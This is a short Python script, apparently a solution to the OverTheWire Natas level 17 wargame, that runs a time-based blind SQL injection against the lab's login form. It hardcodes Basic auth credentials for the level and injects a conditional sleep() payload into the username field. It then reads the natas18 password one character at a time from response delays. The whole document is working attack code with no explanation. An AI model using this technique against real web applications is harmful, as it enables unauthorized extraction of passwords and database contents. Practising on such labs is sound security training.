import requests
import string

headers = {"Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="}
url = "http://natas17.natas.labs.overthewire.org"

password = ""
count = 1
length = 32
chars = string.digits + string.ascii_letters

while count <= length:
    for c in chars: 
        payload = {"username":"natas18\" AND if(binary substring(password,1," + str(count) + ") = \"" + password + c + "\", sleep(4), False)#"}
        response = requests.post(url, data=payload, headers=headers, verify=False) 

        print(payload, " ------ ", response.elapsed.total_seconds())

        if(response.elapsed.total_seconds() > 4):
            password += c
            count += 1
            print("[+] Found char: " + c + " Password: " + password) 
            break

print("[+} Done!")
